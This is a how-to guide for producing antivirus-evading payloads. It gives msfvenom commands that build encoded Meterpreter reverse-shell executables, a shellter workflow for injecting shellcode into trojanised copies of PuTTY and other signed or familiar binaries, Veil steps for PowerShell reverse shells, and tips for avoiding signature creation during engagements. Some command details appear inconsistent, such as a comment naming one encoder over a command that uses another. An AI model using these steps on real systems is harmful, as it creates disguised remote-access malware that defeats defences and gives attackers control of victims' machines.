# Payload Obfuscation and AV Bypass Guide

> Use shellter, veil, and msfvenom encoders to generate payloads that bypass static analysis. This guide covers encoding chain strategies, PE injection methodology, and testing workflows for measuring evasion effectiveness.

## Introduction

Static analysis is the first line of defense for antivirus products. Signature-based detection matches file hashes, byte sequences, and YARA rules against known malware samples. Heuristic analysis examines PE structure, section entropy, import tables, and code patterns to flag suspicious files. Payload obfuscation aims to modify the binary such that these static checks fail while preserving the payload's runtime behavior.

This guide covers three complementary obfuscation approaches: msfvenom encoding chains for payload transformation, shellter PE injection for hiding within legitimate binaries, and veil framework payloads for language-specific evasion. Combining these techniques in layers significantly improves evasion success against modern AV products.

---

## 1. Understanding Static Detection

### Signature-Based Detection

AV products maintain databases of known malicious file hashes (MD5, SHA-1, SHA-256) and byte-pattern signatures. When a file is scanned, its hash is checked against the database and its byte content is matched against signature patterns. YARA rules extend this with pattern matching that can identify malware families based on specific byte sequences, string literals, and structural characteristics.

**What defeats it**: Any transformation that changes the file content (encoding, encryption, compression) produces a different hash and breaks byte-pattern matches. However, the AV vendors also maintain signatures for common packer and encoder stubs, so using well-known tools without customization may still trigger detection.

### Heuristic Analysis

Heuristic engines examine structural characteristics of PE files: section entropy (high entropy suggests encryption or packing), unusual section names, missing or malformed PE headers, suspicious import table entries (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread), and code patterns indicative of shellcode loaders.

**What defeats it**: Injecting shellcode into a legitimate, properly signed PE binary (shellter) preserves normal PE structure and imports. Using low-iteration encoding with legitimate entry points reduces entropy anomalies. Custom loaders that call sensitive APIs indirectly (through function pointer resolution rather than direct imports) avoid triggering import-based heuristics.

---

## 2. msfvenom Encoding Strategies

### Single Encoder with Iterations

The most basic approach applies a single encoder multiple times. Each iteration wraps the payload in another encoding layer, transforming the byte content.

```bash
# shikata_ga_nai: polymorphic XOR encoder (most versatile)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/xor_dynamic -i 5 -f exe -o encoded_i5.exe

# Iteration count recommendations:
# i=1: Minimal transformation, defeats only basic signature matching
# i=3: Moderate transformation, sufficient for some AV products
# i=5-7: Significant byte transformation, better evasion
# i=10+: Diminishing returns, high entropy may trigger heuristic detection
```

**Key consideration**: Higher iteration counts increase PE section entropy. Modern AV products flag sections with entropy above 7.0 bits/byte (random data is 8.0). Monitor entropy with `ent` or `binwalk` and balance encoding iterations against entropy thresholds.

### Multi-Encoder Chains

Chaining different encoders produces more diverse transformations than repeating the same encoder. Each encoder applies a different algorithm (XOR, substitution, position-dependent encoding), making the final output harder to signature.

```bash
# Step 1: Generate raw shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -f raw -o stage0.bin

# Step 2: Encode with XOR-based encoder
msfvenom -p generic/custom PAYLOADFILE=stage0.bin \
  -e x64/xor_dynamic -i 3 -f raw -o stage1.bin

# Step 3: Re-encode with shikata_ga_nai
msfvenom -p generic/custom PAYLOADFILE=stage1.bin \
  -e x86/shikata_ga_nai -i 5 -f exe -o stage2.exe

# Result: Three distinct encoding layers with different algorithms
```

### Available Encoders

```
Encoder                  | Type         | Architecture | Notes
x86/shikata_ga_nai       | Polymorphic  | x86          | Most versatile, XOR-based
x64/xor_dynamic          | XOR          | x64          | Dynamic key generation
x86/alpha_mixed          | Alphanumeric | x86          | Output is alphanumeric only
x86/countdown            | Position     | x86          | Position-dependent encoding
x86/fnstenv_mov          | Polymorphic  | x86          | FPU instruction based
x86/jmp_call_additive    | Position     | x86          | Jump-call decoder stub
```

---

## 3. Shellter PE Injection Methodology

### How Shellter Works

Shellter injects shellcode into an existing PE binary by locating code caves (unused space in PE sections) or extending existing sections. It modifies the PE entry point to jump to the injected shellcode, which executes before returning control to the original program flow. The key advantage is that the host binary retains its original functionality, digital signature structure (though the signature is invalidated), and normal PE characteristics.

### Selecting Host Binaries

Choose host binaries carefully to maximize evasion:

1. **Signed binaries**: Sysinternals tools, Microsoft utilities, or other legitimately signed software. The PE signature structure is preserved (though invalid), reducing heuristic suspicion.
2. **Common utilities**: Binaries that users frequently download and execute (notepad, calc, PuTTY, WinSCP).
3. **Large binaries**: More code caves and space for shellcode injection, reducing the chance of detection through section size anomalies.
4. **Legitimate installers**: Software installers that are expected to perform network operations (reducing behavioral suspicion from the payload's reverse connection).

### Injection Workflow

```bash
# Step 1: Acquire a clean host binary
cp /usr/share/windows-binaries/putty.exe ./putty_host.exe

# Step 2: Run shellter in automatic mode
shellter -a --file putty_host.exe
# Follow prompts:
#   - Payload: windows/meterpreter/reverse_tcp (or custom)
#   - LHOST: attacker IP
#   - LPORT: listener port

# Step 3: Verify injection succeeded
# Shellter reports: injection point, PE modifications, success/failure

# Step 4: Test the injected binary
# a) Original functionality: PuTTY should open normally
# b) Payload execution: meterpreter session should establish
# c) AV detection: test against target AV product
```

### Advanced Shellter Usage

For custom shellcode (e.g., generated by donut or pe2shc), use shellter's manual mode to inject arbitrary shellcode:

```bash
# Generate custom shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/xor_dynamic -i 3 -f raw -o custom.bin

# Inject via shellter manual mode
shellter -m --file host.exe --custom-shellcode custom.bin
# Manual mode allows selecting specific injection points and PE sections
```

---

## 4. Veil Framework Evasion

### Payload Language Selection

Veil generates payloads in multiple programming languages, each with different evasion characteristics:

- **PowerShell (payload 1, 8, 9)**: Leverages PowerShell's built-in capabilities for shellcode execution. Susceptible to AMSI scanning (requires AMSI bypass). Good for engagements where PowerShell is expected.
- **C# (payload 2)**: Compiled .NET executable. Can be converted to shellcode with donut for in-memory execution. Bypasses some script-based detection.
- **Python (payload 3)**: Requires Python on the target or PyInstaller compilation. Good for cross-platform engagements.
- **C (payload 7)**: Native compiled binary with no runtime dependencies. Most flexible for custom modifications but requires compilation infrastructure.

### Veil Evasion Workflow

```bash
# Step 1: Launch Veil
veil

# Step 2: Select Evasion module
Veil>: use Evasion

# Step 3: List available payloads
Veil/Evasion>: list

# Step 4: Select payload type
Veil/Evasion>: use 1  # PowerShell

# Step 5: Configure parameters
Veil/Evasion/powershell/meterpreter/rev_tcp>: set LHOST 10.0.0.1
Veil/Evasion/powershell/meterpreter/rev_tcp>: set LPORT 4444
Veil/Evasion/powershell/meterpreter/rev_tcp>: set USE_ON_DISK false

# Step 6: Generate
Veil/Evasion/powershell/meterpreter/rev_tcp>: generate
```

---

## 5. Testing Methodology

### Local Testing Protocol

1. **Baseline test**: Submit the unencoded payload to the target AV to establish detection baseline.
2. **Iteration test**: Test payloads with increasing encoding iterations (1, 3, 5, 10) and record which iteration count first achieves non-detection.
3. **Layer test**: Test payloads with combined techniques (encode + encrypt, encode + inject) and record detection rates.
4. **Runtime test**: Execute payloads that pass static detection and verify they function correctly while monitoring EDR behavioral alerts.

### Sandbox Testing Best Practices

- **Never use VirusTotal during active engagements**: VT shares samples with all AV vendors, causing signatures to be created for your payloads. Use no-distribution services instead.
- **Test against the actual target product**: Detection varies significantly between products. A payload that bypasses Defender may be caught by CrowdStrike.
- **Test behavioral detection separately**: Static detection can be tested by scanning the file at rest. Behavioral detection requires actually executing the payload in a monitored environment.

### Measuring Success

Record detection rates using the following metrics:

- **Static detection rate**: X/Y engines detect the file at rest (lower is better).
- **Runtime detection**: Whether the payload executes successfully without being quarantined.
- **Behavioral alerts**: Number and type of EDR alerts triggered during execution.
- **Functional verification**: Whether the payload achieves its objective (e.g., meterpreter session established).

---

## References

- **msfvenom Documentation**: https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
- **Shellter Project**: https://www.shellterproject.com/documentation/
- **Veil Framework GitHub**: https://github.com/Veil-Framework/Veil
- **HackTricks - AV Bypass**: https://book.hacktricks.xyz/windows-hardening/av-bypass
- **OWASP Payload Analysis**: https://owasp.org/www-community/attacks/
- **YARA Rules Repository**: https://github.com/Yara-Rules/rules
